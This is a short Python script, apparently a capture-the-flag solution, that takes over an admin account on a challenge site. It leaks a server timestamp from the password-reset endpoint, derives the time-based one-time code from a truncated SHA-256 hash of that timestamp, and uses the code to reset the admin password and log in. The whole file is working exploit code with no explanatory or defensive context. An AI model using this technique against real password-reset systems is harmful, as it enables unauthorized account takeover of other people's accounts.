import requests
import time
import hashlib

url='https://itstime.challenges.cfd'

email='admin@example.com'
password = 'senhasupersecreta'
r = requests.post(url+'/reset-password', json={'email':email,
                                               'otp': False})

t = r.content.decode().split(' ')[-1]

print(t)
t = str(int(t)-60000)
h = t[:-4]
otp = (hashlib.sha256((h.encode())).digest().hex()[0:6])

print(t)
print(h)
print(otp)
r = requests.post(url+'/reset-password', json={'email':email,
                                          'password':None,
                                               'otp': otp})

print(r.content.decode())

r = requests.post(url+'/login', json={'email':email})
print(r.content.decode())
